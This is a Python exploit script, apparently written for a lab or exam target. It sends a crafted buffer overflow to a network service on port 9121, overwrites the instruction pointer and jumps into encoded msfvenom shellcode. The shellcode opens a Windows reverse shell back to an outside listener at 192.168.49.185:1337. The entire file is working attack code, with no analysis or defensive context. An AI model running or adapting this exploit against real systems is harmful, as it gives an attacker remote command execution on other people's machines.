#!/usr/bin/env python3

import socket
import sys
from struct import pack

try:
    if len(sys.argv) < 2:
        server = "192.168.185.10"
    else:
        server = sys.argv[1]

    if len(sys.argv) < 3:
        port = 9121
    else:
        port = int(sys.argv[2])

    print("Usage: {} [TARGET] [PORT] [SIZE]".format(sys.argv[0]))
    print("TARGET: {}".format(server))
    print("PORT: {}".format(str(port)))

    size = 1000
    eip_offset = 128
    bad_char_values = b"\x00\x02\x0a\x0d"
    jmp_over_pointer = b"\xEB\x06"  # jmp short 0x06
    jmp_to_code = b"\x89\xe0"  # mov eax, esp
    jmp_to_code += b"\x66\x05\x6a\x06"  # add ax, 0x66a
    jmp_to_code += b"\xff\xe0"  # jmp eax
    eip = 0x10124d09

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.185 LPORT=1337 EXITFUNC=thread -f python -e x86/shikata_ga_nai -b "\x00\x02\x0a\x0d" -o shellcode.txt
    buf = b""
    buf += b"\xbe\x4c\xbe\x36\xb6\xd9\xcf\xd9\x74\x24\xf4\x5f\x2b"
    buf += b"\xc9\xb1\x52\x83\xc7\x04\x31\x77\x0e\x03\x3b\xb0\xd4"
    buf += b"\x43\x3f\x24\x9a\xac\xbf\xb5\xfb\x25\x5a\x84\x3b\x51"
    buf += b"\x2f\xb7\x8b\x11\x7d\x34\x67\x77\x95\xcf\x05\x50\x9a"
    buf += b"\x78\xa3\x86\x95\x79\x98\xfb\xb4\xf9\xe3\x2f\x16\xc3"
    buf += b"\x2b\x22\x57\x04\x51\xcf\x05\xdd\x1d\x62\xb9\x6a\x6b"
    buf += b"\xbf\x32\x20\x7d\xc7\xa7\xf1\x7c\xe6\x76\x89\x26\x28"
    buf += b"\x79\x5e\x53\x61\x61\x83\x5e\x3b\x1a\x77\x14\xba\xca"
    buf += b"\x49\xd5\x11\x33\x66\x24\x6b\x74\x41\xd7\x1e\x8c\xb1"
    buf += b"\x6a\x19\x4b\xcb\xb0\xac\x4f\x6b\x32\x16\xab\x8d\x97"
    buf += b"\xc1\x38\x81\x5c\x85\x66\x86\x63\x4a\x1d\xb2\xe8\x6d"
    buf += b"\xf1\x32\xaa\x49\xd5\x1f\x68\xf3\x4c\xfa\xdf\x0c\x8e"
    buf += b"\xa5\x80\xa8\xc5\x48\xd4\xc0\x84\x04\x19\xe9\x36\xd5"
    buf += b"\x35\x7a\x45\xe7\x9a\xd0\xc1\x4b\x52\xff\x16\xab\x49"
    buf += b"\x47\x88\x52\x72\xb8\x81\x90\x26\xe8\xb9\x31\x47\x63"
    buf += b"\x39\xbd\x92\x24\x69\x11\x4d\x85\xd9\xd1\x3d\x6d\x33"
    buf += b"\xde\x62\x8d\x3c\x34\x0b\x24\xc7\xdf\xf4\x11\xf6\xa6"
    buf += b"\x9d\x63\xf8\xdd\x64\xed\x1e\xb7\x86\xbb\x89\x20\x3e"
    buf += b"\xe6\x41\xd0\xbf\x3c\x2c\xd2\x34\xb3\xd1\x9d\xbc\xbe"
    buf += b"\xc1\x4a\x4d\xf5\xbb\xdd\x52\x23\xd3\x82\xc1\xa8\x23"
    buf += b"\xcc\xf9\x66\x74\x99\xcc\x7e\x10\x37\x76\x29\x06\xca"
    buf += b"\xee\x12\x82\x11\xd3\x9d\x0b\xd7\x6f\xba\x1b\x21\x6f"
    buf += b"\x86\x4f\xfd\x26\x50\x39\xbb\x90\x12\x93\x15\x4e\xfd"
    buf += b"\x73\xe3\xbc\x3e\x05\xec\xe8\xc8\xe9\x5d\x45\x8d\x16"
    buf += b"\x51\x01\x19\x6f\x8f\xb1\xe6\xba\x0b\xd1\x04\x6e\x66"
    buf += b"\x7a\x91\xfb\xcb\xe7\x22\xd6\x08\x1e\xa1\xd2\xf0\xe5"
    buf += b"\xb9\x97\xf5\xa2\x7d\x44\x84\xbb\xeb\x6a\x3b\xbb\x39"

    inputBuffer = b"\x41" * (eip_offset - len(jmp_over_pointer))
    inputBuffer += jmp_over_pointer
    inputBuffer += pack("<I", eip)
    inputBuffer += b"\x43\x43\x43\x43"
    inputBuffer += jmp_to_code
    inputBuffer += b"\x43" * 32
    inputBuffer += buf
    inputBuffer += b"\x43" * (size - len(inputBuffer))

    print(inputBuffer)

    header = b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])

    buf = header + inputBuffer

    print("Sending buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")